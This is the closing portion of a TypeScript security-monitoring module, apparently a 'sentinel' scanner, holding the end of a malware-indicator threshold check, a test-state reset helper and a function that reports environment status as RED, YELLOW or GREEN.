    isMalicious: malwareIndicators.length >= 2, // Multiple indicators = likely malware
    malwareIndicators,
  };
}

// ============================================================
// EXPORTS FOR TESTING
// ============================================================

export const _testing = {
  resetState: () => {
    _state = {
      scansCompleted: 0,
      threatsDetected: 0,
      lastScan: 0,
      activeHunts: [],
      recentScans: [],
    };
    _tools = null;
  },
};

// ============================================================
// COMPATIBILITY EXPORTS (for payload-validator.ts)
// ============================================================

// NOTE: SentinelStatus is imported from ./sentinel/types

/**
 * Get current environment security status.
 * Returns RED if threats detected recently, YELLOW if scans incomplete, GREEN otherwise.
 */
export function getEnvironmentStatus(): SentinelStatus {
  const status = getSentinelStatus();

  // RED: Active threats detected
  if (status.threatsDetected > 0 && Date.now() - status.lastScan < 300_000) {
    return 'RED';
  }

  // YELLOW: No recent scans or limited tools
  if (status.availableTools.length === 0 || status.scansCompleted === 0) {
    return 'YELLOW';
  }

  // GREEN: All systems nominal
  return 'GREEN';
}
